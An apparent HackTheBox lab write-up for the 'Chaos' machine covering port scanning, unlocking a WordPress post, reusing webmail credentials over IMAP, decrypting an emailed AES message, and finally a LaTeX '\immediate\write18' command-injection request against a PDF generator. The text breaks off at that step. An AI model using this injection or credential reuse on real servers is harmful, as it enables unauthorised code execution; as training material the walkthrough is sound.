I"Â¬<h1 id="htb-chaos-101010120-machine-write-up"><span style="color:red">HTB Chaos (10.10.10.120) MACHINE WRITE-UP</span></h1>

<hr />

<h3 id="table-of-contents">TABLE OF CONTENTS</h3>

<ul>
  <li><a href="#part-1--initial-recon">PART 1 : INITIAL RECON</a></li>
  <li><a href="#part-2--port-enumeration">PART 2 : PORT ENUMERATION</a>
    <ul>
      <li><a href="#tcp-port-80">TCP PORT 80</a></li>
      <li><a href="#tcp-port-995-pop3">TCP PORT 995 (POP3)</a></li>
      <li><a href="#tcp-port-993-imap">TCP PORT 993 (IMAP)</a></li>
    </ul>
  </li>
  <li><a href="#part-3--exploitation">PART 3 : EXPLOITATION</a></li>
  <li><a href="#part-4--generate-user-shell">PART 4 : GENERATE USER SHELL</a></li>
  <li><a href="#part-5--privilege-escalation-ayush---root">PART 5 : PRIVILEGE ESCALATION (ayush -&gt; root)</a></li>
</ul>

<hr />

<h2 id="part-1--initial-recon">PART 1 : INITIAL RECON</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">--min-rate</span> 1000 <span class="nt">-p-</span> <span class="nt">-v</span> 10.10.10.120
<span class="go">
  PORT      STATE SERVICE
  80/tcp    open  http
  110/tcp   open  pop3
  143/tcp   open  imap
  993/tcp   open  imaps
  995/tcp   open  pop3s
  10000/tcp open  snet-sensor-mgmt

</span><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-oN</span> chaos.nmap <span class="nt">-p80</span>,110,143,993,995,10000 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-v</span> 10.10.10.120
<span class="go">
  PORT      STATE SERVICE  VERSION
  80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
  | http-methods: 
  |_  Supported Methods: POST OPTIONS HEAD GET
  |_http-server-header: Apache/2.4.34 (Ubuntu)
  |_http-title: Site doesn't have a title (text/html).
  110/tcp   open  pop3     Dovecot pop3d
  |_pop3-capabilities: RESP-CODES AUTH-RESP-CODE CAPA PIPELINING STLS UIDL TOP SASL
  | ssl-cert: Subject: commonName=chaos
  | Subject Alternative Name: DNS:chaos
  | Issuer: commonName=chaos
  | Public Key type: rsa
  | Public Key bits: 2048
  | Signature Algorithm: sha256WithRSAEncryption
  | Not valid before: 2018-10-28T10:01:49
  | Not valid after:  2028-10-25T10:01:49
  | MD5:   af90 2165 92c7 740f d97a 786a 7e9f cb92
  |_SHA-1: 5a4d 4223 3b08 a24b 7d5a e509 09bf 9570 aa2c f6ba
  |_ssl-date: TLS randomness does not represent time
  143/tcp   open  imap     Dovecot imapd (Ubuntu)
  |_imap-capabilities: IMAP4rev1 STARTTLS LITERAL+ OK have SASL-IR post-login more LOGINDISABLEDA0001 capabilities IDLE listed Pre-login ENABLE ID LOGIN-REFERRALS
  | ssl-cert: Subject: commonName=chaos
  | Subject Alternative Name: DNS:chaos
  | Issuer: commonName=chaos
  | Public Key type: rsa
  | Public Key bits: 2048
  | Signature Algorithm: sha256WithRSAEncryption
  | Not valid before: 2018-10-28T10:01:49
  | Not valid after:  2028-10-25T10:01:49
  | MD5:   af90 2165 92c7 740f d97a 786a 7e9f cb92
  |_SHA-1: 5a4d 4223 3b08 a24b 7d5a e509 09bf 9570 aa2c f6ba
  |_ssl-date: TLS randomness does not represent time
  993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
  | ssl-cert: Subject: commonName=chaos
  | Subject Alternative Name: DNS:chaos
  | Issuer: commonName=chaos
  | Public Key type: rsa
  | Public Key bits: 2048
  | Signature Algorithm: sha256WithRSAEncryption
  | Not valid before: 2018-10-28T10:01:49
  | Not valid after:  2028-10-25T10:01:49
  | MD5:   af90 2165 92c7 740f d97a 786a 7e9f cb92
  |_SHA-1: 5a4d 4223 3b08 a24b 7d5a e509 09bf 9570 aa2c f6ba
  |_ssl-date: TLS randomness does not represent time
  995/tcp   open  ssl/pop3 Dovecot pop3d
  | ssl-cert: Subject: commonName=chaos
  | Subject Alternative Name: DNS:chaos
  | Issuer: commonName=chaos
  | Public Key type: rsa
  | Public Key bits: 2048
  | Signature Algorithm: sha256WithRSAEncryption
  | Not valid before: 2018-10-28T10:01:49
  | Not valid after:  2028-10-25T10:01:49
  | MD5:   af90 2165 92c7 740f d97a 786a 7e9f cb92
  |_SHA-1: 5a4d 4223 3b08 a24b 7d5a e509 09bf 9570 aa2c f6ba
  |_ssl-date: TLS randomness does not represent time
  10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
  |_http-favicon: Unknown favicon MD5: EA9A0A98E2A16B0ADEA1F6ED448F4CEF
  | http-methods: 
  |_  Supported Methods: GET HEAD POST OPTIONS
  |_http-server-header: MiniServ/1.890
</span><span class="gp">  |_http-title: Site doesn't have a title (text/html;</span><span class="w"> </span><span class="nv">Charset</span><span class="o">=</span>iso-8859-1<span class="o">)</span><span class="nb">.</span>
<span class="go">
</span></code></pre></div></div>
<p><strong>NOTE(S)</strong>:</p>
<ul>
  <li>There is an IMAP (Internet Message Access Protocol) service running:
    <ul>
      <li>It ensures that e-mails are synced across multiple devices</li>
      <li>IMAP uses <strong>port 143</strong></li>
      <li>SSL/TLS encrypted IMAP uses <strong>port 993</strong></li>
    </ul>
  </li>
  <li>There is a POP3 (Post Office Protocol version 3) service running:
    <ul>
      <li>It downloads e-mails and deletes them from the server</li>
      <li>POP3 uses <strong>port 110</strong></li>
      <li>SSL/TLS encrypted POP3 uses <strong>port 995</strong></li>
    </ul>
  </li>
</ul>

<hr />

<h2 id="part-2--port-enumeration">PART 2 : PORT ENUMERATION</h2>

<h3 id="tcp-port-80">TCP PORT 80</h3>

<ul>
  <li>
    <p><strong><code class="highlighter-rouge">http://10.10.10.120</code></strong>:</p>

    <p><img src="./screenshots/22_chaos/80_direct_ip.png" alt="Direct IP not allowed" /></p>

    <ul>
      <li><code class="highlighter-rouge">gobuster</code> on <strong><code class="highlighter-rouge">http://10.10.10.120</code></strong>:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>gobuster <span class="nt">-u</span> http://10.10.10.120/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-x</span> php
<span class="go">
  /wp (Status: 301)
  /javascript (Status: 301)

</span></code></pre></div>        </div>
        <ul>
          <li>A <strong>WordPress</strong> directory show up (<code class="highlighter-rouge">/wp</code>)
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
      <li>
        <p><strong><code class="highlighter-rouge">http://10.10.10.120/wp</code></strong>:</p>

        <p><img src="./screenshots/22_chaos/80_wp.png" alt="wp" /></p>

        <ul>
          <li>
            <p>WordPress Home (<a href="http://10.10.10.120/wp/wordpress">/wp/wprdpress</a>):</p>

            <p><img src="./screenshots/22_chaos/80_wp_wordpress.png" alt="Wordpress Home" /></p>

            <p><strong>NOTE(S)</strong>:</p>
            <ul>
              <li>There is a <strong>Protected post</strong> titled <strong>chaos</strong>
                <blockquote>

                </blockquote>
              </li>
            </ul>
          </li>
          <li>
            <p>Wordpress Post: chaos (<a href="http://10.10.10.120/wp/wordpress/index.php/2018/10/28/chaos/">/wp/wordpress/index.php/2018/10/28/chaos/</a>):</p>

            <p><img src="./screenshots/22_chaos/80_wordpress_chaos.png" alt="Wordpress Post: Chaos" /></p>

            <p><strong>NOTE(S)</strong>:</p>
            <ul>
              <li>The post is written by the author, <strong>human</strong></li>
              <li><strong>ARBITRARY GUESS</strong>: Maybe the password is <strong>human</strong>
                <blockquote>

                </blockquote>
              </li>
            </ul>
          </li>
          <li>
            <p>View the post using the password, <strong>human</strong>:</p>

            <p><img src="./screenshots/22_chaos/80_wordpress_chaos_unlocked.png" alt="Wordpress Post unlocked" /></p>

            <p><strong>NOTE(S)</strong>:</p>
            <ul>
              <li>The post contains credentials for a webmail service (<code class="highlighter-rouge">ayush:jiujitsu</code>)</li>
              <li>This may be referring to the <strong>IMAP</strong> or the <strong>POP3</strong> service
                <blockquote>

                </blockquote>
              </li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Try adding <code class="highlighter-rouge">chaos.htb</code> to <code class="highlighter-rouge">/etc/hosts</code>:
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1       localhost
127.0.1.1       kali f
10.10.10.120    chaos.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</code></pre></div>    </div>
  </li>
  <li>
    <p><strong><code class="highlighter-rouge">http://chaos.htb</code></strong>:</p>

    <p><img src="./screenshots/22_chaos/80_chaos_home.png" alt="Chaos Homepage" /></p>

    <ul>
      <li><strong><code class="highlighter-rouge">nikto</code></strong>:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nikto <span class="nt">-host</span> http://chaos.htb
<span class="go">     
  ...omitted...
  + Server: Apache/2.4.34 (Ubuntu)
  ...omitted...

</span></code></pre></div>        </div>

        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li>The service now loads.</li>
          <li>The site only contains static <strong>html</strong> pages</li>
          <li>The server running is <code class="highlighter-rouge">Apache</code></li>
          <li>There might be hidden <strong>php</strong> files
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
      <li><strong><code class="highlighter-rouge">gobuster</code></strong> on <strong><code class="highlighter-rouge">http://chaos.htb/</code></strong>:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>gobuster <span class="nt">-u</span> http://chaos.htb <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-x</span> php
<span class="go">   
  /img (Status: 301)
  /css (Status: 301)
  /source (Status: 301)
  /js (Status: 301)
  /javascript (Status: 301)

</span></code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li>Nothing interesting seems to pop up</li>
          <li>What if <code class="highlighter-rouge">gobuster</code> was ran directly on http://10.10.10.120 ?</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h3 id="tcp-port-995-pop3">TCP PORT 995 (POP3)</h3>

<ul>
  <li><strong><code class="highlighter-rouge">openssl</code></strong>:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>openssl s_client <span class="nt">-connect</span> 10.10.10.120:995
<span class="go">
  +OK Dovecot (Ubuntu) ready.
   
</span><span class="gp">$</span><span class="w"> </span>user ayush
<span class="go"> 
  +OK

</span><span class="gp">$</span><span class="w"> </span>pass jiujitsu
<span class="go">
  +OK Logged in.
     
</span><span class="gp">$</span><span class="w"> </span>list
<span class="go">
  +OK 0 messages:
</span><span class="c">  .
</span></code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>There are currently no messages present in the service</li>
      <li>The service might be a <strong>RABBIT HOLE</strong></li>
    </ul>
  </li>
</ul>

<h3 id="tcp-port-993-imap">TCP PORT 993 (IMAP)</h3>

<ul>
  <li><strong><code class="highlighter-rouge">openssl</code></strong>:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>openssl s_client <span class="nt">-connect</span> 10.10.10.120:993
<span class="go">
  * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] Dovecot (Ubuntu) ready.
   
</span><span class="gp">$</span><span class="w"> </span>a login ayush jiujitsu
<span class="go">
  a OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in

</span><span class="gp">$</span><span class="w"> </span>b list <span class="s2">""</span> <span class="k">*</span>
<span class="go">
  * LIST (\NoInferiors \UnMarked \Drafts) "/" Drafts
  * LIST (\NoInferiors \UnMarked \Sent) "/" Sent
  * LIST (\HasNoChildren) "/" INBOX
  b OK List completed (0.001 + 0.000 secs).
    
</span><span class="gp">$</span><span class="w"> </span>1 SELECT Drafts
<span class="go">
  * FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
  * OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
  * 1 EXISTS
  * 0 RECENT
  * OK [UIDVALIDITY 1540728611] UIDs valid
  * OK [UIDNEXT 5] Predicted next UID
  1 OK [READ-WRITE] Select completed (0.001 + 0.000 secs).
     
</span><span class="gp">$</span><span class="w"> </span>2 FETCH 1:<span class="k">*</span> <span class="o">(</span>FLAGS INTERNALDATE BODY.PEEK[HEADER.FIELDS <span class="o">(</span>SUBJECT<span class="o">)])</span>
<span class="go">
  * 1 FETCH (FLAGS (\Seen) INTERNALDATE "28-Oct-2018 12:16:38 +0000" BODY[HEADER.FIELDS (SUBJECT)]{20}
  Subject: service
     
  )
  2 OK Fetch completed (0.001 + 0.000 secs).

</span><span class="gp">$</span><span class="w"> </span>3 FETCH 1 BODY[TEXT]
<span class="go">
  * 1 FETCH (BODY[TEXT] {2183}
     
</span></code></pre></div>    </div>
    <ul>
      <li>MESSAGE #1:
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Content-Transfer-Encoding: 7bit
Content-Type: text/plain; charset=US-ASCII;
format=flowed

Hii, sahay
Check the enmsg.txt
You are the password XD.
Also attached the script which i used to encrypt.
Thanks,
Ayush

</code></pre></div>        </div>
      </li>
      <li>ATTACHMENT #1:
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Content-Transfer-Encoding: base64
Content-Type: application/octet-stream;
name=enim_msg.txt
Content-Disposition: attachment;
filename=enim_msg.txt;
size=272

MDAwMDAwMDAwMDAwMDIzNK7uqnoZitizcEs4hVpDg8z18LmJXjnkr2tXhw/AldQmd/g53L6pgva9
RdPkJ3GSW57onvseOe5ai95/M4APq+3mLp4GQ5YTuRTaGsHtrMs7rNgzwfiVor7zNryPn1Jgbn8M
7Y2mM6I+lH0zQb6Xt/JkhOZGWQzH4llEbyHvvlIjfu+MW5XrOI6QAeXGYTTinYSutsOhPilLnk1e
6Hq7AUnTxcMsqqLdqEL5+/px3ZVZccuPUvuSmXHGE023358ud9XKokbNQG3LOQuRFkpE/LS10yge
+l6ON4g1fpYizywI3+h9l5Iwpj/UVb0BcVgojtlyz5gIv12tAHf7kpZ6R08=
</code></pre></div>        </div>
      </li>
      <li>ATTACHMENT #2:
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Content-Transfer-Encoding: base64
Content-Type: text/x-python; charset=us-ascii;
name=en.py
Content-Disposition: attachment;
filename=en.py;
size=804

ZGVmIGVuY3J5cHQoa2V5LCBmaWxlbmFtZSk6CiAgICBjaHVua3NpemUgPSA2NCoxMDI0CiAgICBv
dXRwdXRGaWxlID0gImVuIiArIGZpbGVuYW1lCiAgICBmaWxlc2l6ZSA9IHN0cihvcy5wYXRoLmdl
dHNpemUoZmlsZW5hbWUpKS56ZmlsbCgxNikKICAgIElWID1SYW5kb20ubmV3KCkucmVhZCgxNikK
CiAgICBlbmNyeXB0b3IgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfQ0JDLCBJVikKCiAgICB3aXRo
IG9wZW4oZmlsZW5hbWUsICdyYicpIGFzIGluZmlsZToKICAgICAgICB3aXRoIG9wZW4ob3V0cHV0
RmlsZSwgJ3diJykgYXMgb3V0ZmlsZToKICAgICAgICAgICAgb3V0ZmlsZS53cml0ZShmaWxlc2l6
ZS5lbmNvZGUoJ3V0Zi04JykpCiAgICAgICAgICAgIG91dGZpbGUud3JpdGUoSVYpCgogICAgICAg
ICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgY2h1bmsgPSBpbmZpbGUucmVhZChjaHVu
a3NpemUpCgogICAgICAgICAgICAgICAgaWYgbGVuKGNodW5rKSA9PSAwOgogICAgICAgICAgICAg
ICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbGlmIGxlbihjaHVuaykgJSAxNiAhPSAwOgog
ICAgICAgICAgICAgICAgICAgIGNodW5rICs9IGInICcgKiAoMTYgLSAobGVuKGNodW5rKSAlIDE2
KSkKCiAgICAgICAgICAgICAgICBvdXRmaWxlLndyaXRlKGVuY3J5cHRvci5lbmNyeXB0KGNodW5r
KSkKCmRlZiBnZXRLZXkocGFzc3dvcmQpOgogICAgICAgICAgICBoYXNoZXIgPSBTSEEyNTYubmV3
KHBhc3N3b3JkLmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgcmV0dXJuIGhhc2hlci5kaWdl
c3QoKQoK
</code></pre></div>        </div>
      </li>
    </ul>

    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>There are three message drafts in the service:
        <ul>
          <li><strong>MESSAGE #1</strong> says that there is an encrypted message and the password is <code class="highlighter-rouge">sahay</code></li>
          <li><strong>MESSAGE #1</strong> also says that the script used to encrypt the message is included</li>
          <li><strong>ATTACHMENT #1</strong> is the base64 encoded encrypted message (<code class="highlighter-rouge">enim_msg.txt</code>)</li>
          <li><strong>ATTACHMENT #2</strong> is the base64 encoded script used for encryption (<code class="highlighter-rouge">en.py</code>)</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<hr />

<h2 id="part-3--exploitation">PART 3 : EXPLOITATION</h2>

<ul>
  <li>Examine the encryption script:
    <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
   <span class="n">chunksize</span> <span class="o">=</span> <span class="mi">64</span><span class="o">*</span><span class="mi">1024</span>
   <span class="n">outputFile</span> <span class="o">=</span> <span class="s">"en"</span> <span class="o">+</span> <span class="n">filename</span>
   <span class="n">filesize</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getsize</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
   <span class="n">IV</span> <span class="o">=</span><span class="n">Random</span><span class="o">.</span><span class="n">new</span><span class="p">()</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>

   <span class="n">encryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">IV</span><span class="p">)</span>

   <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">infile</span><span class="p">:</span>
      <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">outputFile</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">outfile</span><span class="p">:</span>
         <span class="n">outfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">filesize</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
         <span class="n">outfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">IV</span><span class="p">)</span>

         <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">chunk</span> <span class="o">=</span> <span class="n">infile</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">chunksize</span><span class="p">)</span>

            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
               <span class="k">break</span>
            <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
               <span class="n">chunk</span> <span class="o">+=</span> <span class="n">b</span><span class="s">' '</span> <span class="o">*</span> <span class="p">(</span><span class="mi">16</span> <span class="o">-</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span><span class="p">))</span>

            <span class="n">outfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">encryptor</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">chunk</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">getKey</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
   <span class="n">hasher</span> <span class="o">=</span> <span class="n">SHA256</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
   <span class="k">return</span> <span class="n">hasher</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
</code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>The output file has three parts â <code class="highlighter-rouge">filesize</code>, <code class="highlighter-rouge">IV</code>, <code class="highlighter-rouge">encryptor.encrypt(chunk)</code></li>
      <li>The <code class="highlighter-rouge">filesize</code> which is 16 characters long:
        <ul>
          <li>The <code class="highlighter-rouge">zfill(n)</code> function fills the string with leading zeroes until the string is length <strong>n</strong></li>
        </ul>
      </li>
      <li>The <code class="highlighter-rouge">IV</code> (Initialization Vector) which is 16 characters long
        <ul>
          <li><code class="highlighter-rouge">Random.new().read(16)</code> returns 16 random characters</li>
        </ul>
      </li>
      <li>Then the encrypted message
        <blockquote>

        </blockquote>
      </li>
    </ul>
  </li>
  <li>Create a decryptor script (<code class="highlighter-rouge">decryptor.py</code>):
    <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="nn">Crypto.Hash</span> <span class="kn">import</span> <span class="n">SHA256</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
   <span class="n">in_file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span>
   <span class="n">encrypted_message</span> <span class="o">=</span> <span class="n">in_file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
   <span class="n">in_file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

   <span class="n">key</span> <span class="o">=</span> <span class="n">SHA256</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
   <span class="n">iv</span> <span class="o">=</span> <span class="n">encrypted_message</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">32</span><span class="p">]</span>
   <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>

   <span class="k">return</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_message</span><span class="p">[</span><span class="mi">32</span><span class="p">:])</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
                        
<span class="k">print</span><span class="p">(</span><span class="n">decrypt</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
</code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li><code class="highlighter-rouge">sys.argv[1]</code> is the file that contains the encrypted message</li>
      <li><code class="highlighter-rouge">sys.argv[2]</code> is the password</li>
      <li>The <code class="highlighter-rouge">IV</code> string is in index <code class="highlighter-rouge">[16:32]</code>
        <blockquote>

        </blockquote>
      </li>
    </ul>
  </li>
  <li>Run <code class="highlighter-rouge">decryptor.py</code>:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">echo </span>MDAwMDAwMDAwMDAwMDIzNK7uqnoZitizcEs4hVpDg8z18LmJXjnkr2tXhw/AldQmd/g53L6pgva9RdPkJ3GSW57onvseOe5ai95/M4APq+3mLp4GQ5YTuRTaGsHtrMs7rNgzwfiVor7zNryPn1Jgbn8M7Y2mM6I+lH0zQb6Xt/JkhOZGWQzH4llEbyHvvlIjfu+MW5XrOI6QAeXGYTTinYSutsOhPilLnk1e6Hq7AUnTxcMsqqLdqEL5+/px3ZVZccuPUvuSmXHGE023358ud9XKokbNQG3LOQuRFkpE/LS10yge+l6ON4g1fpYizywI3+h9l5Iwpj/UVb0BcVgojtlyz5gIv12tAHf7kpZ6R08<span class="o">=</span> | <span class="nb">base64</span> <span class="nt">--decode</span> <span class="o">&gt;</span> enim_msg.txt
<span class="go">
</span><span class="gp">$</span><span class="w"> </span>python decryptor.py enim_msg.txt sahay
<span class="go">
  SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK
</span></code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>According to <strong>Ayush</strong>, <code class="highlighter-rouge">sahay</code> is the password</li>
      <li>A base64 encoded message is output
        <blockquote>

        </blockquote>
      </li>
    </ul>
  </li>
  <li>Decode the message:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span><span class="nb">echo </span>SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK | <span class="nb">base64</span> <span class="nt">-d</span>
<span class="go">
  Hii Sahay

  Please check our new service which create pdf

  p.s - As you told me to encrypt important msg, i did :)

  http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3

  Thanks,
  Ayush
</span></code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>A link to a webpage is in the message</li>
    </ul>
  </li>
</ul>

<hr />

<h2 id="part-4--generate-user-shell">PART 4 : Generate User Shell</h2>

<ol>
  <li>Visit http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3:
    <ul>
      <li>
        <p>Landing Page:</p>

        <p><img src="./screenshots/22_chaos/80_enim_link.png" alt="PDF Creator" /></p>
      </li>
    </ul>

    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>Pressing <code class="highlighter-rouge">Create PDF</code> creates a <strong>POST</strong> request to <code class="highlighter-rouge">/ajax.php</code>
        <blockquote>

        </blockquote>
      </li>
    </ul>
  </li>
  <li>Check server response when creating a PDF
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-d</span> <span class="s2">"content=test&amp;template=test1"</span> http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php
<span class="go">
  LOG:
  This is pdfTeX, Version 3.14159265-2.6-1.40.19 (TeX Live 2019/dev/Debian) (preloaded format=pdflatex)
   \write18 enabled.
  entering extended mode

</span></code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li><code class="highlighter-rouge">\write18 enabled</code> is written in the response.
        <ul>
          <li><code class="highlighter-rouge">\write</code> is used to write to a stream</li>
          <li>Stream <code class="highlighter-rouge">18</code> is referenced to the shell (or terminal)</li>
        </ul>
      </li>
      <li>When used with <code class="highlighter-rouge">\immediate</code>, <code class="highlighter-rouge">\write18</code> immediately executes instead of after the page has been served
        <blockquote>

        </blockquote>
      </li>
    </ul>
  </li>
  <li>Attempt RCE (Remote Code Execution):
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-d</span> <span class="s2">"content=</span><span class="se">\i</span><span class="s2">mmediate</span><span class="se">\w</span><span class="s2">rite18{id}&amp;template=test1"</span> http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php
<span class="go">
  LOG:
